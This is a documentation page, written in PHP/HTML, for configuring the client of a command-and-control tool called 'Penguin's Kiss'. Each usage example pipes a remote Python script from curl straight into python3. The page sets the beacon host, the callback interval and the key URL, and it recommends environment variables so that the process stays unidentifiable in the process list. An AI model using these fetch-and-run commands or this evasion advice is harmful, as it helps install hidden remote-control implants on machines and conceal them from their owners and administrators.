<!DOCTYPE html>
<html lang="en">
    <head>
<?php
require('include/meta.php');
?>
        <title>Client Configuration | Docs | Penguin&apos;s Kiss</title>
        <link rel="canonical" href="https://c2.pkctl.org/client" />
    </head>
<?php
require('include/header.php');
?>
                <p>As you may have noticed reading the precompiled scripts section, the client binary
                    allows configuration options to be passed in a number of ways. The first thing it
                    will look for, for any given option, is a specifically-named environment variable,
                    as this will not be visible in the process name. Failing this, the client will try
                    less subtle approaches, looking for positional command-line arguments, prompting
                    the standard input, and finally falling back to a preset default value (which you
                    may find it useful to alter the script in order to tweak if you don&apos;t want to
                    pass anything in through the alternative methods.) Generally your run command will
                    look something like:</p>
                <pre>curl -s https://dl.pkctl.org/pk.py | OPT1=val1 OPT2=val2... python3 -</pre>
                <p>This has the distinct advantage as only showing up as <code>python3 -</code> in the
                    process list, which leaves precious little to identify what it is actually doing.
                    For this reason, environment variable input is highly recommended.</p>
                <section id="hdb">
                    <h3>HDB URL</h3>
                    <p>Unless your server is using the default server key (not recommended), you will
                        need to specify a URL from which the server&apos;s public RSA key can be
                        fetched. The format of this file can be found in the
                        <a href="/hdb">Hosts Database</a>
                        section of the documentation.</p>
                    <p>Environment Variable Name: <code>HDB</code></p>
                    <p>Command-Line Argument Order: first</p>
                    <p>Default Value: <code>https://war.cflems.net/hosts.json</code></p>
                    <p>Usage:</p>
                    <pre>curl -s https://dl.pkctl.org/pk.py | HDB=https://dl.pkctl.org/b8ca2180.json python3 -</pre>
                </section>
                <section id="host">
                    <h3>TCP Host</h3>
                    <p>This is the TCP host to which your client will attempt to connect at a specified
                        interval. You will most invariably want to specify or recode this parameter.
                        Port number is optional and specified with a colon in the hostname.</p>
                    <p>Environment Variable Name: <code>HOST</code></p>
                    <p>Command-Line Argument Order: second</p>
                    <p>Default Value: <code>sek.cflems.net:2236</code></p>
                    <p>Usage:</p>
                    <pre>curl -s https://dl.pkctl.org/pk.py | HOST=raw.pkctl.org python3 -</pre>
                </section>
                <section id="tts">
                    <h3>Time to Sleep</h3>
                    <p>This is the interval at which the client will wake up and attempt to establish
                        a connection to the remote server, if it does not succeed immediately. Unit is
                        seconds.</p>
                    <p>Environment Variable Name: <code>TTS</code></p>
                    <p>Command-Line Argument Order: third</p>
                    <p>Default Value: <code>1800</code> (30 minutes)</p>
                    <p>Usage:</p>
                    <pre>curl -s https://dl.pkctl.org/pk.py | TTS=86400 python3 -</pre>
                </section>
                <section id="bits">
                    <h3>RSA Bits</h3>
                    <p>Can be used to turn down the bits used for RSA keys and messages for faster
                        operation at the expense of security. Needs to be synced between the client
                        and server. I recommend leaving this value alone.</p>
                    <p>Environment Variable Name: <code>BITS</code></p>
                    <p>Command-Line Argument Order: fourth</p>
                    <p>Default Value: <code>4096</code></p>
                    <p>Usage:</p>
                    <pre>curl -s https://dl.pkctl.org/pk.py | BITS=2048 python3 -</pre>
                </section>
<?php
require('include/footer.php');
?>
</html>
